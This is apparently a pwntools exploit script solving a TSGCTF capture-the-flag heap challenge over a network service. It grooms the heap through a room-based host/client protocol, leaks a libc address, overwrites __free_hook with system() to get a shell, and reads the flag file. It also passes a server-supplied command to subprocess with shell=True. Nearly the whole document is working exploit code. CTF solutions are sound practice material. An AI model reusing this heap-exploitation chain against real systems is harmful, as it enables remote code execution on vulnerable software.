from __future__ import division, print_function
import random
from pwn import *
import argparse
import time
import sys


context.log_level = 'error'

log = False
is_gaibu = True
if is_gaibu:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "127.0.0.1"
    port = 3001

r = remote(host, port)
r.recvuntil(b"as a client")
r.sendline(b"1")
if is_gaibu:
    r.recvuntil(b"Submit the token generated by `")
    cmd = r.recvuntil(b"`").strip(b"`")
    print(cmd)
    result = subprocess.check_output(cmd, shell=True)
    hashc = result.replace(b"hashcash token: ", b"")
    r.sendline(hashc)
r.recvuntil(b"room id is ")
ROOM_ID = r.recvline().strip(b"\n")
print(ROOM_ID)
r.close()

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def debug(x):
    if not is_gaibu:
        print(x)

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


def host_(name, wait=True):
    for i in range(30):
        r = remote(host, port)
        r.recvuntil(b"as a client")
        r.sendline(b"2")
        r.recvuntil(b"a room id")
        r.sendline(ROOM_ID)
        s = r.recvuntil(b"t")
        s = r.recv()
        #print(s)
        if b'is a connection alive' not in s:
            break
        r.close()
        time.sleep(1)
    else:
        raise Exception("??")

    #print(r.recvuntil(b">"))
    if type(name) == str:
        name = name.encode("ascii")
    r.sendline(name)
    if wait:
        r.recvuntil(b"connected")
    return r

def client(name):
    for i in range(30):
        r = remote(host, port)
        r.recvuntil(b"as a client")
        r.sendline(b"3")
        r.recvuntil(b"a room id")
        r.sendline(ROOM_ID)

        s = r.recvuntil(b"t")
        s = r.recv()
        debug(s)
        if b'is a connection alive' not in s:
            break
        time.sleep(2)
    else:
        raise Exception("??")
    #print(r.recvuntil(b">"))
    if type(name) == str:
        name = name.encode("ascii")
    r.sendline(name)
    return r

def set_data(r, ty, data, wait=True):
    debug(r.recvuntil(b">"))
    r.sendline(b"1")
    r.recvuntil(b">")
    r.sendline(ty)
    r.recvuntil(b">")
    if type(data) == str:
        data = data.encode("ascii")
    r.sendline(data)
    if wait:
        r.recvuntil(b"Menu")

def set_int(r, data, wait=True):
    set_data(r, b"int", data, wait)

def set_str(r, data):
    set_data(r, b"str", data)

def send_data(r, wait=False):
    debug(r.recvuntil(b">"))
    r.sendline(b"2")
    if wait:
        r.recvuntil(b"Menu")

def receive_data(r):
    r.recvuntil(b">")
    r.sendline(b"3")
    return r.recvline()

def send_str(frm, to, data):
    set_str(frm, data)
    send_data(frm)
    frm.recvuntil(b"Menu")
    receive_data(to)
    to.recvuntil(b"Menu")

BIGNUM = str(0x10000000000000000000)

print("starting...")
c = client("fuga")
h = host_("hoge", False)
wait_for_attach()
debug(c.recvline())
debug(h.recvline())

# setup heap

'''
0x55ded26e06d0      0x0                 0x30                 Freed
0x55ded26e0700      0x0                 0x20                 Used
'''
VICTIM_SIZE = 0x220
send_str(h, c, "A" * VICTIM_SIZE)


def kill_process(r):
    set_str(r, "u" * 1)
    set_int(r, BIGNUM)
    send_data(r)
    r.close()

kill_process(h)

def send_line(data):
    print(f"sending {data}...")
    h = host_(data)
    send_data(c, wait=True)
    kill_process(h)


send_line("2")
send_line(str(0x440))


import base64
# send "AAAAAAAA"
print("sending A...")

#payload = "X" * 0xe8 + 
h = host_(base64.b64encode(b"A"))
send_data(c, wait=True)

receive_data(c)

receive_data(h)
receive_data(h)
kill_process(h)

send_line("2")
send_line("10")
h = host_(base64.b64encode(b"2"))
send_data(c, wait=True)

time.sleep(1)
h.recvline()
s = h.recvline()
if b'The opponent is' not in s:
    print(s)
    raise("fail")
data = base64.b64decode(s.replace(b"The opponent is ", b"").strip(b"\n"))
libc_addr = u64(data[8:16]) - 0x1ebfe0
print(hex(libc_addr))

system = libc_addr + 0x55410
free_hook = libc_addr + 0x1eeb28

receive_data(c)

set_str(c, "A" * 80)
send_str(h, c, "A" * 1)
set_str(c, "A" * 160)

kill_process(h)

send_line("2")
send_line("88")
h = host_(base64.b64encode(b"A" * 0x70 + p64(free_hook)))
send_data(c, wait=True)

receive_data(c)
wait_for_attach()
send_str(h, c, p64(system))

kill_process(h)

set_str(c, "sh")
set_int(c, "1", wait=False)



#send_line("2")
#send_line("10")
#h = host_(b"sh")
#send_data(c, wait=True)

#wait_for_attach()
#receive_data(c)

#c.interactive()


#c.recvuntil(b"waiting...")
c.sendline(b"cat flag-b0322d90bc8ae4ca79633200c81e20b7; echo UOUO")
s = c.recvuntil(b"UOUO")
if b"TSGCTF" in s:
    print(s)
    sys.exit(0)
else:
    sys.exit(1)